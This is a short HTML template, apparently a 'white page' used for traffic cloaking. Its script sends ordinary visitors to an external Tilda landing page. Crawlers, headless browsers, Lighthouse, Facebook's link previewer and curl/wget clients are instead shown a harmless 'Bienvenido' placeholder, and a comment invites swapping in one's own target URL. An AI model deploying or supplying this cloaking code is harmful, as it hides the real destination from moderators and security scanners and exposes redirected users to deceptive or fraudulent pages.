<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>White Page</title>
  <script>
    // ССЫЛКА НА ФИНАЛКУ
    const redirectUrl = "http://argentinaforreal.tilda.ws/"; // замени на свою

    const userAgent = navigator.userAgent.toLowerCase();
    const isWebdriver = navigator.webdriver === true;

    // Очень мягкий фильтр: только явные сканеры и headless
    const softBotPatterns = [
      /headless/i,
      /lighthouse/i,
      /preview/i,
      /facebookexternalhit/i,
      /curl/i,
      /wget/i
    ];
    const isBotUA = softBotPatterns.some(p => p.test(userAgent));

    if (!isBotUA && !isWebdriver) {
      // Проходит почти весь реальный трафик
      window.location.href = redirectUrl;
    } else {
      // Остаётся на white
      document.write(`
        <h1 style="text-align:center; margin-top: 60px;">Bienvenido</h1>
        <p style="text-align:center; font-size:12px;">(Тестовый белый экран для подозрительного трафика)</p>
      `);
    }
  </script>
</head>
<body>
</body>
</html>
